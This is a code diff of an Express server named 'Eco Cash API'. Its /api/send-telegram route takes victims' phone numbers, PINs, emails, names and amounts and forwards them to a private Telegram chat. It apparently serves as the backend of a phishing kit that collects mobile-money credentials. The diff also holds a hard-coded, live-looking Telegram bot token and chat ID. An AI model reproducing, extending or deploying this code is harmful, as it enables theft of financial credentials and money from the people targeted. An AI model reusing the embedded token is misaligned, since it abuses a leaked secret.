@@ -16,7 +16,7 @@ app.use((req, res, next) => {
 app.use(express.json());
 
 // Health check
-app.get('/api/health', (req, res) => {
+app.get('/health', (req, res) => {
     res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
@@ -25,6 +25,7 @@ app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, amount, term, type } = req.body;
         
+        // YOUR TELEGRAM CREDENTIALS
         const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
         const TG_CHAT_ID = '8392790531';
         
@@ -37,7 +38,7 @@ app.post('/api/send-telegram', async (req, res) => {
         
         const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
         
-        await fetch(url);
+        const response = await fetch(url);
         
         console.log('✅ Notification sent:', type, phone);
         res.json({ success: true });
@@ -49,7 +50,7 @@ app.post('/api/send-telegram', async (req, res) => {
 
 // Root route
 app.get('/', (req, res) => {
-    res.send('Eco Cash API is running!');
+    res.json({ status: 'OK', message: 'Eco Cash API is running!' });
 });
 
 app.listen(PORT, () => {
